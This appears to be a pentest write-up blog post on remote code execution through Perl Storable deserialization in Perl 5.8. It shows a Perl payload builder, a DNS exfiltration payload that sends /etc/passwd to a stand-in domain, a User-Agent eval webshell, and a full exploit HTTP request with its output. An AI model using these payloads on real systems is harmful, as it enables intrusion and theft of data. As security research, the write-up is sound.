
# Deserialization in Perl v5.8 | Agarri : Sécurité informatique offensive

[Original URL](http://www.agarri.fr/kom/archives/2016/02/06/deserialization_in_perl_v5_8/index.html)

> During a pentest, I found an application containing a form with a hidden parameter named "state". Encoded as Base64, it contains a few strings and some binary data: $ echo...

[]() During a pentest, I found an application containing a form with a hidden parameter named "state". Encoded as Base64, it contains a few strings and some binary data:

```
$ echo 'BAcIMTIzNDU2NzgECAgIAwMAAAAEAwAAAAAGAAAAcGFyYW1zCIIEAAAAc3RlcAQDAQAAAAiAHgAAAF9fZ2V0X3dvcmtmbG93X2J1c2luZXNzX3BhcmFtcwQAAABkYXRh' | base64 -d | hd 
00000000 04 07 08 31 32 33 34 35 36 37 38 04 08 08 08 03 |...12345678.....|
00000010 03 00 00 00 04 03 00 00 00 00 06 00 00 00 70 61 |..............pa|
00000020 72 61 6d 73 08 82 04 00 00 00 73 74 65 70 04 03 |rams......step..|
00000030 01 00 00 00 08 80 1e 00 00 00 5f 5f 67 65 74 5f |..........__get_|
00000040 77 6f 72 6b 66 6c 6f 77 5f 62 75 73 69 6e 65 73 |workflow_busines|
00000050 73 5f 70 61 72 61 6d 73 04 00 00 00 64 61 74 61 |s_params....data|
```

I launched a "Character frobber" attack using the Intruder tool from Burp Suite, in order to slightly corrupt this interesting parameter. The result was more than interesting:

![](http://www.agarri.fr/docs/frobber.png)

So the target is using Perl and v2.7 of the Storable format. A quick online search revealed that [Storable](http://perldoc.perl.org/Storable.html) is a Perl module used for data serialization. A big [security warning](http://perldoc.perl.org/Storable.html#SECURITY-WARNING) in the official documentation states the following:

```
Some features of Storable can lead to security vulnerabilities if you accept Storable documents from untrusted sources. Most
obviously, the optional (off by default) CODE reference serialization feature allows transfer of code to the deserializing
process. Furthermore, any serialized object will cause Storable to helpfully load the module corresponding to the class of
the object in the deserializing module. For manipulated module names, this can load almost arbitrary code. Finally, the
deserialized object's destructors will be invoked when the objects get destroyed in the deserializing process. Maliciously
crafted Storable documents may put such objects in the value of a hash key that is overridden by another key/value pair in
the same hash, thus causing immediate destructor execution.
```

Looking around for previous publications on this subject, I came along a video named [Weaponizing Perl Serialization Flaws with MetaSploit](https://www.youtube.com/watch?v=Gzx6KlqiIZE). As a bonus, the author published all the code related to his talk on [GitHub](https://github.com/lightsey/cve-2015-1592). And Metasploit includes the [exploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/sixapart_movabletype_storable_exec.rb) itself. So we have a known-to-be-vulnerable technology, a detailled explanantion of the weaponization process and some exploits working on a different target. Should not be too hard :-D But after some testing, I realized that I was unable to map my experimentations to the process described in the video :-( Anyway... after finding that Storable uses [by default](http://search.cpan.org/~ams/Storable-2.51/Storable.pm#MEMORY_STORE) an architecture-dependant format and that nfreeze() should be use for cross-platform serialization, I came up with the following code:

```
#!/usr/bin/perl

use MIME::Base64 qw( encode_base64 );
use Storable qw( nfreeze );

{
 package foobar;
 sub STORABLE_freeze { return 1; }
}

# Serialize the data
my $data = bless { ignore => 'this' }, 'foobar';
my $frozen = nfreeze($data);

# Encode as Base64+URL and display
$frozen = encode_base64($frozen, '');
$frozen =~ s/\+/%2B/g;
$frozen =~ s/=/%3D/g;
print "$frozen\n";
```

Producing the following interesting error:

```
No STORABLE_thaw defined for objects of class foobar (even after a "require foobar;") at ../../lib/Storable.pm (autosplit into ../../lib/auto/Storable/thaw.al) line 366, at /var/www/cgi-bin/victim line 29
For help, please send mail to the webmaster (support@bigcorp.tld), giving this error message and the time and date of the error.
```

It looks like the string "foobar" (under my control) is used in a "require" statement! So maybe that a single ";" would be enough to inject arbitrary Perl code :-D I rushed to the source code to confirm this behavior, but was quite disappointed after looking at [Storable.xs](https://metacpan.org/source/AMS/Storable-2.51/Storable.xs):

```
 if (!Gv_AMG(stash)) {
 const char *package = HvNAME_get(stash);
 TRACEME(("No overloading defined for package %s", package));
 TRACEME(("Going to load module '%s'", package));
 load_module(PERL_LOADMOD_NOIMPORT, newSVpv(package, 0), Nullsv);
 if (!Gv_AMG(stash)) {
 CROAK(("Cannot restore overloading on %s(0x%"UVxf") (package %s) (even after a \"require %s;\")",
 sv_reftype(sv, FALSE), PTR2UV(sv), package, package));
 }
 }
```

Despite was the error message says, there's no "require" but only a call to load_module(), as described in the video at 00:11:20 :-( But I tried anyway and patched the name of the serialized object to "POSIX;sleep(5)":

```
$ echo 'BQgTAg5QT1NJWDtzbGVlcCg1KQEx' | base64 -d | hd
00000000 05 08 13 02 0e 50 4f 53 49 58 3b 73 6c 65 65 70 |.....POSIX;sleep|
00000010 28 35 29 01 31 |(5).1|
```

And to my surprise, I got a delayed response when submitting it. What?!?! I went back to the source-code of the Storable module and noticed, some time later, the following change (when diffing Storable.xs v2.15 and v2.51):

```
4295,4298c4387,4388
< TRACEME(("Going to require module '%s' with '%s'", classname, SvPVX(psv)));
< 
< perl_eval_sv(psv, G_DISCARD);
< sv_free(psv);
---
> TRACEME(("Going to load module '%s'", classname));
> load_module(PERL_LOADMOD_NOIMPORT, newSVpv(classname, 0), Nullsv);
```

That would explain the error message! At some point, the object name was directly passed to a require statement evaluated via [perl_eval_sv()](http://search.cpan.org/~timb/perl5.004_04/pod/perlguts.pod#perl_eval_sv). And my target was running a version of Perl old enough to be impacted :-D In fact, every version of Perl >= 5.10 uses the new loading mechanism and some old distributions (like RHEL/CentOS 5) are still running Perl v5.8\. So I simply need to put my payload in the object name, after loading any default module like "POSIX". 252 bytes (the maximum length of an object name) is more than enough to insert a decent payload. For example, reading /etc/passwd and exfiltrating its content via DNS by chunks of 45 characters (189 bytes). Very useful when the target doesn't have any direct outbound connectivity or forbid to execute some binaries:

```
Socket;use MIME::Base64;sub x{$z=shift;for($i=0;$i<length($z);$i+=45){$x=encode_base64(substr($z,$i,$i+45),'');gethostbyname($x.".dom.tld");}} open(f,"/etc/passwd");while(<f>){x($_)}
```

Or, much shorter and powerful: pass some Perl code in the User-Agent HTTP header, eval it server-side then exit (39 bytes):

```
POSIX;eval($ENV{HTTP_USER_AGENT});exit;
```

In this specific scenario of a "dumb" CGI (without mod_perl, Catalyst, Mojolicious, ...) using [fatalsToBrowser](http://perldoc.perl.org/CGI/Carp.html#MAKING-PERL-ERRORS-APPEAR-IN-THE-BROWSER-WINDOW) from CGI::Carp, stdout and stderr will be redirected to the browser. So we can have a real webshell:

```
POST /cgi-bin/victim HTTP/1.1
Host: 192.168.2.103
User-Agent: system("id;uname -a;cat /etc/*release*");
Content-Type: application/x-www-form-urlencoded
Content-Length: 367

key=xs&state=BQgTAvxQT1NJWDtldmFsKCRFTlZ7SFRUUF9VU0VSX0FHRU5UfSk7ZXhpdDs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsBMQ%3D%3D
```

And the response:

```
HTTP/1.1 200 OK
Date: Sat, 06 Feb 2016 16:51:09 GMT
Server: Apache/2.2.3 (CentOS)
Connection: close
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 281

<html><head><title>Validation workflow</title></head><body>
<br/>uid=48(apache) gid=48(apache) groups=48(apache) context=root:system_r:httpd_sys_script_t:s0
Linux perlthaw 2.6.18-164.el5 #1 SMP Thu Sep 3 03:28:30 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux
CentOS release 5.11 (Final)
```

Or, if you prefer a Burp Suite screenshot:

![](http://www.agarri.fr/docs/thaw-pwned.png)

PWNED! Feel free to play with the following files: the vulnerable programm [victim](http://www.agarri.fr/docs/victim) and the exploit itself [PoC_thaw_perl58.pl](http://www.agarri.fr/docs/PoC_thaw_perl58.pl). Please keep in mind that the exploitation path will be different on Perl > 5.8
